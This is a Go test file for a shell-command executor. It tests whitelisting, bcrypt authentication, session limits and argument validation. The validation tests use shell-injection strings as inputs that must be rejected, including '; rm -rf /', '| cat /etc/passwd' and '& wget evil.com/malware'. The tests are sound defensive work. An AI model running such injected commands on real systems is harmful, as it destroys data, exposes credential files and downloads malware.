package shell

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/bcrypt"
)

// mustHashPassword generates a bcrypt hash for testing purposes.
func mustHashPassword(password string) string {
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.MinCost)
	if err != nil {
		panic("failed to hash password: " + err.Error())
	}
	return string(hash)
}

func TestNewExecutor(t *testing.T) {
	tests := []struct {
		name   string
		config Config
	}{
		{
			name: "disabled",
			config: Config{
				Enabled: false,
			},
		},
		{
			name: "enabled with whitelist",
			config: Config{
				Enabled:     true,
				Whitelist:   []string{"bash", "sh"},
				MaxSessions: 10,
			},
		},
		{
			name: "enabled with wildcard",
			config: Config{
				Enabled:      true,
				Whitelist:    []string{"*"},
				MaxSessions:  10,
				PasswordHash: mustHashPassword("testpassword"),
			},
		},
		{
			name: "with timeout",
			config: Config{
				Enabled:     true,
				Whitelist:   []string{"*"},
				MaxSessions: 5,
				Timeout:     60 * time.Second,
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(tt.config)
			if exec == nil {
				t.Fatal("NewExecutor() returned nil")
			}

			if exec.config.Enabled != tt.config.Enabled {
				t.Errorf("config.Enabled = %v, want %v", exec.config.Enabled, tt.config.Enabled)
			}
		})
	}
}

func TestExecutor_ValidateAuth(t *testing.T) {
	password := "secretpassword"
	hash := mustHashPassword(password)

	tests := []struct {
		name         string
		passwordHash string
		password     string
		wantErr      bool
	}{
		{
			name:         "no password configured",
			passwordHash: "",
			password:     "",
			wantErr:      false,
		},
		{
			name:         "correct password",
			passwordHash: hash,
			password:     password,
			wantErr:      false,
		},
		{
			name:         "wrong password",
			passwordHash: hash,
			password:     "wrongpassword",
			wantErr:      true,
		},
		{
			name:         "empty password when required",
			passwordHash: hash,
			password:     "",
			wantErr:      true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:      true,
				PasswordHash: tt.passwordHash,
			})

			err := exec.ValidateAuth(tt.password)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAuth() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestExecutor_IsCommandAllowed(t *testing.T) {
	tests := []struct {
		name      string
		whitelist []string
		command   string
		want      bool
	}{
		{
			name:      "empty whitelist - nothing allowed",
			whitelist: []string{},
			command:   "ls",
			want:      false,
		},
		{
			name:      "wildcard allows all",
			whitelist: []string{"*"},
			command:   "anything",
			want:      true,
		},
		{
			name:      "exact match",
			whitelist: []string{"ls", "cat", "echo"},
			command:   "cat",
			want:      true,
		},
		{
			name:      "not in whitelist",
			whitelist: []string{"ls", "cat"},
			command:   "rm",
			want:      false,
		},
		{
			name:      "path not allowed",
			whitelist: []string{"bash"},
			command:   "/bin/bash",
			want:      false,
		},
		{
			name:      "vim allowed",
			whitelist: []string{"vim", "bash"},
			command:   "vim",
			want:      true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})

			got := exec.IsCommandAllowed(tt.command)
			if got != tt.want {
				t.Errorf("IsCommandAllowed(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestExecutor_ValidateArgs(t *testing.T) {
	tests := []struct {
		name      string
		whitelist []string
		args      []string
		wantErr   bool
	}{
		{
			name:      "empty args",
			whitelist: []string{"echo"},
			args:      []string{},
			wantErr:   false,
		},
		{
			name:      "wildcard mode - skip validation",
			whitelist: []string{"*"},
			args:      []string{"; rm -rf /"},
			wantErr:   false, // Wildcard mode skips validation
		},
		{
			name:      "shell injection - semicolon",
			whitelist: []string{"echo"},
			args:      []string{"; rm -rf /"},
			wantErr:   true,
		},
		{
			name:      "shell injection - pipe",
			whitelist: []string{"echo"},
			args:      []string{"| cat /etc/passwd"},
			wantErr:   true,
		},
		{
			name:      "shell injection - ampersand",
			whitelist: []string{"echo"},
			args:      []string{"& wget evil.com/malware"},
			wantErr:   true,
		},
		{
			name:      "shell injection - backtick",
			whitelist: []string{"echo"},
			args:      []string{"`id`"},
			wantErr:   true,
		},
		{
			name:      "shell injection - dollar parentheses",
			whitelist: []string{"echo"},
			args:      []string{"$(whoami)"},
			wantErr:   true,
		},
		{
			name:      "absolute path not allowed",
			whitelist: []string{"cat"},
			args:      []string{"/etc/passwd"},
			wantErr:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := NewExecutor(Config{
				Enabled:   true,
				Whitelist: tt.whitelist,
			})
			err := exec.ValidateArgs(tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateArgs(%v) error = %v, wantErr %v", tt.args, err, tt.wantErr)
			}
		})
	}
}

func TestExecutor_AcquireReleaseSession(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 2,
	})

	// Acquire first session
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v for first session", err)
	}

	// Acquire second session
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v for second session", err)
	}

	// Third should fail (max 2)
	if err := exec.AcquireSession(); err == nil {
		t.Error("AcquireSession() should have failed for third session")
	}

	// Release one
	exec.ReleaseSession()

	// Now should succeed
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v after release", err)
	}

	// Check active count
	if exec.ActiveSessions() != 2 {
		t.Errorf("ActiveSessions() = %d, want 2", exec.ActiveSessions())
	}
}

func TestExecutor_NewSession(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping session test on Windows")
	}

	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"*"},
		Timeout:     10 * time.Second,
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	session, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session.Close()
		exec.ReleaseSession()
	}()

	// Start the session
	if err := session.Start(); err != nil {
		t.Fatalf("session.Start() error = %v", err)
	}

	// Wait for completion
	select {
	case <-session.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("session did not complete in time")
	}

	// Check exit code
	if session.ExitCode() != 0 {
		t.Errorf("ExitCode() = %d, want 0", session.ExitCode())
	}
}

func TestExecutor_NewSession_NotWhitelisted(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 10,
		Whitelist:   []string{"ls", "cat"}, // echo not allowed
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "echo",
		Args:    []string{"hello"},
	}

	_, err := exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for non-whitelisted command")
	}

	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("NewSession() error = %q, want error containing 'not allowed'", err.Error())
	}
}

func TestExecutor_NewSession_AuthRequired(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:      true,
		MaxSessions:  10,
		Whitelist:    []string{"*"},
		PasswordHash: mustHashPassword("secret"),
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command:  "echo",
		Args:     []string{"hello"},
		Password: "", // No password
	}

	_, err := exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for missing password")
	}

	if !strings.Contains(err.Error(), "authentication") {
		t.Errorf("NewSession() error = %q, want error containing 'authentication'", err.Error())
	}
}

func TestExecutor_NewSession_SessionLimit(t *testing.T) {
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 1,
		Whitelist:   []string{"*"},
	})

	ctx := context.Background()
	meta := &ShellMeta{
		Command: "sleep",
		Args:    []string{"10"},
	}

	// First session
	session1, err := exec.NewSession(ctx, meta)
	if err != nil {
		t.Fatalf("NewSession() error = %v", err)
	}
	defer func() {
		session1.Close()
		exec.ReleaseSession()
	}()

	// Second should fail (max 1)
	_, err = exec.NewSession(ctx, meta)
	if err == nil {
		t.Error("NewSession() expected error for session limit")
	}

	if !strings.Contains(err.Error(), "max sessions") {
		t.Errorf("NewSession() error = %q, want error containing 'max sessions'", err.Error())
	}
}

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()

	if cfg.Enabled {
		t.Error("DefaultConfig().Enabled = true, want false")
	}

	if len(cfg.Whitelist) != 0 {
		t.Errorf("DefaultConfig().Whitelist = %v, want empty", cfg.Whitelist)
	}

	if cfg.MaxSessions != 0 {
		t.Errorf("DefaultConfig().MaxSessions = %d, want 0 (unlimited)", cfg.MaxSessions)
	}

	if cfg.Timeout != 0 {
		t.Errorf("DefaultConfig().Timeout = %v, want 0", cfg.Timeout)
	}
}

func TestExecutor_AcquireSession_Unlimited(t *testing.T) {
	// MaxSessions = 0 means unlimited
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 0,
	})

	// Should be able to acquire many sessions without limit
	for i := 0; i < 100; i++ {
		if err := exec.AcquireSession(); err != nil {
			t.Errorf("AcquireSession() error = %v at session %d, want nil (unlimited)", err, i+1)
		}
	}

	if exec.ActiveSessions() != 100 {
		t.Errorf("ActiveSessions() = %d, want 100", exec.ActiveSessions())
	}

	// Release all
	for i := 0; i < 100; i++ {
		exec.ReleaseSession()
	}

	if exec.ActiveSessions() != 0 {
		t.Errorf("ActiveSessions() = %d after release, want 0", exec.ActiveSessions())
	}
}

func TestExecutor_AcquireSession_Limited(t *testing.T) {
	// MaxSessions > 0 enforces limit
	exec := NewExecutor(Config{
		Enabled:     true,
		MaxSessions: 3,
	})

	// Acquire up to limit
	for i := 0; i < 3; i++ {
		if err := exec.AcquireSession(); err != nil {
			t.Errorf("AcquireSession() error = %v at session %d", err, i+1)
		}
	}

	// Fourth should fail
	if err := exec.AcquireSession(); err == nil {
		t.Error("AcquireSession() should fail when limit reached")
	} else if !strings.Contains(err.Error(), "max sessions") {
		t.Errorf("AcquireSession() error = %q, want error containing 'max sessions'", err.Error())
	}

	// Release one and try again
	exec.ReleaseSession()
	if err := exec.AcquireSession(); err != nil {
		t.Errorf("AcquireSession() error = %v after release", err)
	}
}
